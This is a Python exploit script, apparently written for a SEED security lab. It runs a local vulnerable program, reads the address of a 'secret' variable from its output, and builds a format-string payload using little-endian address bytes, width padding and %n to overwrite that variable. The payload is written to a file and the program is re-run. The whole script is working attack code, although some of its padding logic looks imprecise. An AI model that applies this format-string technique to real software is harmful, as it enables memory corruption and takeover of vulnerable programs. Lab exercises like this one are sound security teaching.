import os
import subprocess

# Define the binary and other constants
binary = "/home/seed/Desktop/lab8/play/vul_prog"

def get_secret_address(binary):
    """
    Run the binary and extract the secret variable's address.
    """
    import re

    proc = subprocess.Popen(binary, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = proc.communicate()
    
    print("Program output for debugging:")
    print(output.decode('latin-1'))  # Print the raw output
    for line in output.decode('latin-1').splitlines():
        print("Line: {}".format(line))  # Debug: print each line
        # Match the line containing the secret variable's address
        if "secret" in line and "address" in line:
            match = re.search(r"0x[0-9a-fA-F]+", line)
            if match:
                return match.group(0)  # Extract and return the address
    return None






def craft_payload(secret_addr, target_value):
    """
    Craft the payload based on the secret address and target value.
    """
    # Convert the secret address to little-endian format
    addr = bytearray.fromhex(secret_addr[2:])
    addr.reverse()
    addr = addr.decode('latin-1')

    # Calculate the padding needed to write the target value
    num_chars = target_value
    if num_chars > len(addr):
        padding = "%%%dx" % num_chars
    else:
        padding = ""
    
    payload = addr + " " + padding + " %n"
    return payload

def run_exploit(binary, payload):
    """
    Execute the binary with the crafted payload.
    """
    with open("vulfile", "wb") as f:
        f.write(payload.encode())
    proc = subprocess.Popen(binary, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = proc.communicate()
    return output.decode()

# Get the secret variable's address
secret_addr = get_secret_address(binary)
if not secret_addr:
    print("Failed to retrieve secret variable's address.")
    exit(1)

print("Secret variable's address: %s" % secret_addr)

# Target value for the secret variable
target_value = 68

# Craft the payload
payload = craft_payload(secret_addr, target_value)
print("Crafted payload: %s" % payload)

# Run the exploit
output = run_exploit(binary, payload)
print("Program output:")
print(output)
